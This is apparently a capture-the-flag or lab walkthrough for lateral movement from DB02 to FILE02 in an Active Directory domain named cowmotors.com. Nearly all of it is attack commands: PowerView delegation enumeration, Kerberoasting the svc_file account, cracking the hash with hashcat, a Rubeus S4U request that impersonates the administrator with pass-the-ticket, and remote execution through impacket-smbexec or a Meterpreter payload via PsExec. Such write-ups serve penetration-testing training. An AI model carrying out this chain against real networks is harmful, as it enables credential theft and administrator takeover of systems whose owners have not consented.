# Lateral movement to FILE02

Once you have access on DB02, the user svc_file has contrained delegation over CIFS/file02.cowmotors.com.

Import PowerView.ps1.  
`. .\PowerView.ps1`

List the delegations:  
`Get-DomainUser -TrustedToAuth -Domain cowmotors.com`

Ask the TGT of svc_file (the user is Kerberoastable, so asks for SPN users):  
`Get-DomainUser -SPN -Domain cowmotors.com | Get-DomainSPNTicket`

Put the hash of svc_file (discard the other hash, you won't need it) and put it on one line in a file, then crack it:  
`hashcat -a 0 -m 13100 svcfile_hash.txt /path/to/rockyou.txt`

With the password, generate its RC4/NTLM hash:  
`.\Rubeus hash /password:<password>`

And asks for S4U and pass the ticket into memory /!\ beware the SPN must respect this format, not with full domain /!\:  
`.\Rubeus s4u /impersonateuser:administrator /dc:dc01 /domain:cowmotors.com /user:svc_file /rc4:<PREVIOUS HASH> /msdsspn:cifs/FILE02 /ptt`

Check you have administrator access on FILE02:  
`dir \\FILE02\C$`

Then, either copy the Base64 ticket and import it on Linux and impacket-smbexec, either copy your Meterpreter EXE payload and run it with PsExec.
